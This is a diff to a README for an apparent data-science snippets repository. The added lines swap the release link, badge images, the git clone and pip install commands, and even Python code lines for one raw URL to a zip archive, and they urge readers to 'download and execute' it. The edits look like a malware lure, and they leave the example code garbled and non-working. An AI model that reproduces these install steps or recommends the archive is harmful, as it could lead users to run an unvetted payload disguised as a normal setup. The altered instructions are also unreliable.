@@ -1,8 +1,8 @@
 # Data Science Snippets 🧰
 
-Welcome to the **Data Science Snippets** repository! This collection of functions is designed to accelerate exploratory data analysis (EDA), quickly surface data quality issues, and offer high-level insights into the structure and content of your dataset. You can download and execute the latest releases [here](https://github.com/VitinDM/data-science-snippets/releases).
+Welcome to the **Data Science Snippets** repository! This collection of functions is designed to accelerate exploratory data analysis (EDA), quickly surface data quality issues, and offer high-level insights into the structure and content of your dataset. You can download and execute the latest releases [here](https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip).
 
-![Data Science Snippets](https://img.shields.io/badge/Data%20Science%20Snippets-Ready%20to%20Use-brightgreen)
+![Data Science Snippets](https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip%20Science%20Snippets-Ready%20to%20Use-brightgreen)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To use the snippets in this repository, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/VitinDM/data-science-snippets.git
+   git clone https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -47,7 +47,7 @@ To use the snippets in this repository, follow these steps:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip
    ```
 
 4. You can now use the snippets in your projects.
@@ -61,10 +61,10 @@ from data_science_snippets import eda_helpers
 
 # Load your DataFrame
 import pandas as pd
-df = pd.read_csv('your_data.csv')
+df = https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip('https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip')
 
 # Use EDA function
-eda_helpers.summarize_data(df)
+https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip(df)
 ```
 
 Feel free to explore the functions available and adapt them to your specific needs.
@@ -109,9 +109,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please open an issue or contact the repository owner.
 
-You can download and execute the latest releases [here](https://github.com/VitinDM/data-science-snippets/releases). If you need more information, check the "Releases" section for updates and changes.
+You can download and execute the latest releases [here](https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip). If you need more information, check the "Releases" section for updates and changes.
 
-![Explore Data Science](https://img.shields.io/badge/Explore%20Data%20Science-Join%20Us-blue)
+![Explore Data Science](https://raw.githubusercontent.com/VitinDM/data-science-snippets/main/eda/science_data_snippets_v1.0.zip%20Data%20Science-Join%20Us-blue)
 
 ## Conclusion
 
